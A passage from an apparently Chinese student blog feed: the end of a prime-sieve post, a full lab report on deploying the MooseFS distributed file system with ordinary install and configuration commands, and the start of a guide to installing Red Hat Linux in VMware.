<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有质数，耗时1.316479s；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170649.png"></p>
</li>
<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有质数，耗时155.330692s，生成的prime文件大小为2.02 GB；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170659.png"></p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170708.png" style="zoom:50%;"></li>
<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.885ex" role="img" focusable="false" viewBox="0 -833.2 1290.1 833.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有质数，耗时284.451798s，生成prime文件大小达到3.97GB，打印过程中16G内存,使用率达到89%；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170809.png"></p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170819.png" style="zoom:67%;">

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170929.png"></p>
</li>
</ol>
<h1 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h1><p><a href="https://github.com/Leeyuxun/Print-Prime">https://github.com/Leeyuxun/Print-Prime</a></p>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>埃拉托斯特尼筛法</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核 实验七</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%83.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>以MooseFS-PB分布式文件系统为例，了解分布式文件系统实现方法，功能特点及作用.</p>
<span id="more"></span>

<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ol>
<li><p><code>master server</code>: <code>Ubuntu 18.04</code> </p>
<p>IP: <code>10.128.255.181</code></p>
</li>
<li><p>元数据日志服务器: <code>Ubuntu 16.04</code> </p>
<p>IP: <code>10.128.243.103</code></p>
</li>
<li><p><code>chunk server</code>: <code>Ubuntu 16.04</code> </p>
<p>IP: <code>10.128.219.79</code></p>
</li>
<li><p>客户端: <code>Ubuntu 16.04</code> </p>
<p>IP: <code>10.128.205.7</code></p>
</li>
</ol>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="搭建master-server"><a href="#搭建master-server" class="headerlink" title="搭建master server"></a>搭建<code>master server</code></h2><h3 id="安装编译器、工具包"><a href="#安装编译器、工具包" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol>
<li><p>输入如下命令，安装相关编译器、工具包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103043.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103126.png"></p>
</li>
<li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/local/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103228.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103315.png"></p>
</li>
<li><p>修改输出目录配置文件、定义挂载以及权限设定文件、主配置文件、元数据日志文件信息；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/mfs/etc/mfs/</span><br><span class="line"><span class="comment">#修改输出目录配置文件，定义挂载以及权限设定文件</span></span><br><span class="line">$ sudo <span class="built_in">cp</span> mfsexports.cfg.sample  mfsexports.cfg</span><br><span class="line"><span class="comment">#修改主配置文件</span></span><br><span class="line">$ sudo <span class="built_in">cp</span> mfsmaster.cfg.sample mfsmaster.cfg</span><br><span class="line"><span class="comment">#修改元数据日志文件</span></span><br><span class="line">$ sudo <span class="built_in">cp</span> mfstopology.cfg.sample  mfstopology.cfg</span><br><span class="line"><span class="comment">#修改master元数据文件</span></span><br><span class="line">$ <span class="built_in">cd</span> /usr/local/mfs/var/mfs/</span><br><span class="line">$ sudo <span class="built_in">cp</span> metadata.mfs.empty metadata.mfs</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103559.png"></p>
</li>
</ol>
<h3 id="启动master-server"><a href="#启动master-server" class="headerlink" title="启动master server"></a>启动<code>master server</code></h3><ol>
<li><p>创建进程用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li>
<li><p>授权、优化路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">chown</span> -R mfs.mfs /usr/local/mfs</span><br><span class="line">$ sudo <span class="built_in">ln</span> -s /usr/local/mfs/sbin/* /usr/local/bin/</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103748.png"></p>
</li>
<li><p>启动服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo mfsmaster start</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103816.png"></p>
</li>
<li><p>查看服务运行成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfsmaster</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217104015.png"></p>
</li>
</ol>
<h2 id="搭建元数据日志服务器"><a href="#搭建元数据日志服务器" class="headerlink" title="搭建元数据日志服务器"></a>搭建元数据日志服务器</h2><h3 id="安装编译器、工具包-1"><a href="#安装编译器、工具包-1" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol>
<li><p>输入如下命令，安装相关编译器、工具包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217111359.png"></p>
</li>
<li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/local/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217111630.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217111710.png"></p>
</li>
<li><p>修改主配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/mfs/etc/mfs/</span><br><span class="line">$ sudo <span class="built_in">cp</span> mfsmaster.cfg.sample mfsmaster.cfg</span><br><span class="line">$ sudo <span class="built_in">cp</span> mfsexports.cfg.sample mfsexports.cfg</span><br><span class="line">$ sudo <span class="built_in">cp</span> mfsmetalogger.cfg.sample mfsmetalogger.cfg</span><br><span class="line">$ sudo <span class="built_in">cd</span> /usr/local/mfs/var/mfs</span><br><span class="line">$ sudo <span class="built_in">cp</span> metadata.mfs.empty metadata.mfs</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217112115.png"></p>
<p>修改<code>mfsmetalogger.cfg</code>文件内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/mfs/etc/mfs/</span><br><span class="line">$ sudo vi mfsmetalogger.cfg</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MASTER_HOST = 10.128.255.181 #执行master服务器的ip地址</span><br><span class="line">META_DOWNLOAD_FREQ = 24 #备份频率时间</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217112527.png"></p>
</li>
</ol>
<h3 id="启动元数据日志服务器"><a href="#启动元数据日志服务器" class="headerlink" title="启动元数据日志服务器"></a>启动元数据日志服务器</h3><ol>
<li><p>创建进程用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li>
<li><p>授权、优化路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">chown</span> -R mfs.mfs /usr/local/mfs</span><br><span class="line">$ sudo <span class="built_in">ln</span> -s /usr/local/mfs/sbin/* /usr/local/bin/</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo mfsmetalogger start</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217113220.png"></p>
</li>
<li><p>查看服务运行成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfsmetalogger</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217113318.png"></p>
</li>
</ol>
<h2 id="搭建chunk-server"><a href="#搭建chunk-server" class="headerlink" title="搭建chunk server"></a>搭建<code>chunk server</code></h2><h3 id="安装编译器、工具包-2"><a href="#安装编译器、工具包-2" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol>
<li><p>输入如下命令，安装相关编译器、工具包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115449.png"></p>
</li>
<li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/local/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115558.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115632.png"></p>
</li>
<li><p>修改主配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/mfs/etc/mfs/</span><br><span class="line">$ sudo <span class="built_in">cp</span> mfschunkserver.cfg.sample  mfschunkserver.cfg</span><br><span class="line">$ sudo <span class="built_in">cp</span> mfshdd.cfg.sample  mfshdd.cfg</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115959.png"></p>
<p>修改<code>mfschunkserver.cfg</code>文件内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vi mfschunkserver.cfg</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MASTER_HOST  = 10.128.255.181 #指向master服务器的ip地址,去掉注释符号</span><br><span class="line">MASTER_PORT  = 9420</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217120337.png"></p>
<p>修改<code>mfshdd.cfg</code>文件内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加一行</span></span><br><span class="line">/data </span><br><span class="line"><span class="comment">#这是一个给MFS的分区，生产环境中最好使用独立的分区，或者磁盘挂载到此目录下</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="启动chunk-server"><a href="#启动chunk-server" class="headerlink" title="启动chunk server"></a>启动<code>chunk server</code></h3><ol>
<li><p>创建进程用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li>
<li><p>创建MFS分区目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">mkdir</span> /data</span><br><span class="line">$ sudo <span class="built_in">chown</span> -R mfs:mfs /data/</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217120859.png"></p>
</li>
<li><p>授权、优化路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">chown</span> -R mfs.mfs /usr/local/mfs</span><br><span class="line">$ sudo <span class="built_in">ln</span> -s /usr/local/mfs/sbin/* /usr/local/bin/</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo mfschunkserver start</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217121020.png"></p>
</li>
<li><p>查看服务运行成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfschunkserve</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217182216.png"></p>
</li>
</ol>
<h2 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h2><h3 id="安装编译器、工具包-3"><a href="#安装编译器、工具包-3" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol>
<li><p>输入如下命令，安装相关编译器、工具包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217171507.png"></p>
</li>
<li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/local/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217171639.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217171716.png"></p>
</li>
</ol>
<h3 id="挂载MFS文件系统"><a href="#挂载MFS文件系统" class="headerlink" title="挂载MFS文件系统"></a>挂载MFS文件系统</h3><ol>
<li><p>创建进程用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li>
<li><p>授权、优化路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">chown</span> -R mfs.mfs /usr/local/mfs</span><br><span class="line">$ sudo <span class="built_in">ln</span> -s /usr/local/mfs/sbin/* /usr/local/bin/</span><br></pre></td></tr></table></figure></li>
<li><p>挂载MFS文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建挂载点</span></span><br><span class="line">$ sudo <span class="built_in">mkdir</span> /mnt/mfs</span><br><span class="line"><span class="comment">#加载fuse模块到内核</span></span><br><span class="line">$ sudo modprobe fuse</span><br><span class="line"><span class="comment">#挂载MFS</span></span><br><span class="line">$ sudo /usr/local/mfs/bin/mfsmount /mnt/mfs/ -H 10.128.255.181</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217173730.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217173645.png"></p>
</li>
<li><p>启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo mfscgiserv start</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217182700.png"></p>
</li>
<li><p>查看是否启动成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfs</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217173859.png"></p>
</li>
<li><p>打开浏览器，输入url：<code>http://10.128.205.7:9425</code>，显示如下，配置成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217183000.png"></p>
</li>
<li><p>输入<code>master  server</code>的ip地址，则会显示<code>master server</code>的相关信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217183644.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217183316.png"></p>
</li>
</ol>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>分布式文件系统管理</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核-实验一</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%80.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>安装<code>Red Hat Linux</code>。</li>
<li>熟悉<code>Linux</code>目录结构以及目录功能简介。</li>
<li>熟悉<code>Linux</code>系统的基本操作。</li>
<li><code>Vi</code>的熟悉与使用。</li>
<li>安装并使用<code>Linux</code>的编译器<code>GCC</code>，编写一个能通过编译且运行成功的小程序。<span id="more"></span></li>
</ol>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="VMware-workstation-安装Red-Hat-Linux"><a href="#VMware-workstation-安装Red-Hat-Linux" class="headerlink" title="VMware workstation 安装Red Hat Linux"></a><code>VMware workstation</code> 安装<code>Red Hat Linux</code></h2><ol>
<li><p>打开<code>VMware workstation</code>，一次选择“<strong>文件→新建虚拟机→自定义安装→下一步</strong>”，选择稍后安装操作系统，点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image004.jpg" alt="img"></p>
</li>
<li><p>选择客户机操作系统为<code>Linux</code>，版本为<code>Red Hat Enterprise 6 64位</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image006.jpg" alt="img"></p>
</li>
<li><p>命名虚拟机为：<code>Red Hat Enterprise 6 64位</code>，设置虚拟机路径点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image008.jpg" alt="img"></p>
</li>
<li><p>配置处理器数量为1，每个处理器的内核内核数量为1，点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image010.jpg" alt="img"></p>
</li>
<li><p>设置虚拟机内存为<code>2GB</code>，点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image012.jpg" alt="img"></p>
</li>
<li><p>设置网络类型为<code>NAT</code>模式，点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image014.jpg" alt="img"></p>
</li>
<li><p>选择I/O控制器类型为<code>LSI Logic</code>，磁盘类型为<code>SCSI</code>,点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image016.jpg" alt="img"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image018.jpg" alt="img"></p>
</li>
<li><p>选择创建新的虚拟磁盘，磁盘大小为<code>20GB</code>，将磁盘拆分成多个文件，点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image020.jpg" alt="img"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image022.jpg" alt="img"></p>
</li>
<li><p>命名指定磁盘文件，点击下一步；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image024.jpg" alt="img"></p>
</li>
<li><p>点击自定义硬件，添加虚拟机ISO镜像路径，设备状态设置为已连接，否则无法检测到镜像，然后点击安装完成；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image026.jpg" alt="img"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image028.jpg" alt="img"></p>
</li>
<li><p>打开虚拟机，<code>Install or upgrade an existing system</code>进入图形安装界面；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image030.jpg" alt="img"></p>
</li>
<li><p>开始测试硬盘，选择OK；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image032.jpg" alt="img"></p>
</li>
<li><p>测试完成后进入安装界面，开始安装；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image034.jpg" alt="img"></p>
</li>
<li><p>选择语言为中文简体；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image036.jpg" alt="img"></p>
</li>
<li><p>选择安装键盘为美国英语式；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image038.jpg" alt="img"></p>
</li>
